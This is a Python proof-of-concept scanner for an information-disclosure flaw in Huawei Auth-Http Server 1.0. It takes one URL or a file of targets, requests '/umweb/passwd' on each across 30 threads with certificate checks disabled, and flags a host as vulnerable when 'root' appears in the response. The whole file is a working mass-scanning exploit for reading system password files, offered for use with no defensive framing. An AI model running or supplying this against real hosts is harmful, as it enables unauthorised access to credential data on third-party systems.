import requests
import time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

import argparse

def furl(f):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Connection': 'close'}

    try:
        r = requests.get(f, headers=headers, verify=False, timeout=10)

        if r.status_code == 200 and 'root' in r.text:
            print(f"{f}[*]存在漏洞")
        else:
            print(f"{f}[-]没有漏洞")
    except Exception as e:
        print(f"{f}[-]超时")


if __name__ == '__main__':
    parse = argparse.ArgumentParser(description="Huawei Auth-Http Server 1.0 信息泄露漏洞验证")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(30)
if args.url:
    furl(args.url)
if args.file:
    f1 = open(args.file, 'r')
    targets = []
    for l in f1.readlines():
        l = l.strip()
        if "http" in l:
            target = f"{l}/umweb/passwd"
            targets.append(target)
        else:
            target = f"https://{l}/umweb/passwd"
            targets.append(target)
    pool.map(furl, targets)
    pool.close()
